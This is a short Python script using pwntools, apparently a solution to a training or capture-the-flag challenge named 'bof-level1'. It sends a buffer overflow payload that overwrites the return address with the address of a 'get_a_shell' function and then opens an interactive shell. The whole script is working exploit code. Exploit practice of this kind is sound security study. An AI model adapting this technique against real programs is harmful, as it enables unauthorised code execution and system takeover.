from pwn import *

# Set up attack
p = process("./bof-level1")
e = ELF("./bof-level1")
prog_input = (32 * '1') + ('ABCDEFGHabcdefgh') + (8 * '1') + (p64(e.symbols['get_a_shell']))

# Initiate attack
print(p.recv(0x200))
p.sendline(prog_input)
p.interactive()
